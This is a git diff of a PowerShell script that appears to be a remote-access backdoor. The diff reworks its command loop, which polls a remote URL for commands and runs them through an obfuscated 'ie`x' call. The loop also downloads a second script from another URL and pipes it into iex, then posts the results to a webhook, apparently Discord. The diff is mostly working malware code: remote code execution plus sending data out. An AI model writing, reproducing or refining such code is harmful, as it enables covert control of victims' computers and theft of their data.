@@ -376,10 +376,7 @@ Start-Sleep -Milliseconds 10
 while($true){
 $response = Invoke-RestMethod -Uri $GHurl
 
-    if ($response -match "$previouscmd") {
-    write-output "No command found.."
-    }
-    else{
+    if (!($response -match "$previouscmd")) {
     Write-Output "Command found!"
         if ($response -match "close") {
             $previouscmd = $response        
@@ -423,10 +420,9 @@ $response = Invoke-RestMethod -Uri $GHurl
             $previouscmd = $response
             $customcommand = Invoke-RestMethod -Uri $CCurl | iex
         }
-        else {
+        elseif (!($response -match "$previouscmd")) {
             $Result=ie`x($response) -ErrorAction Stop
-            $Result
-            if ($result.length -eq 0){
+            if (($result.length -eq 0) -or ($result -contains "public_flags")){
                 $previouscmd = $response
             }
             else{
@@ -435,6 +431,9 @@ $response = Invoke-RestMethod -Uri $GHurl
                 Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Body $jsonsys
             }
         }
+    }
+    else{
+    write-output "No command found.."
     }
 sleep 10
 }
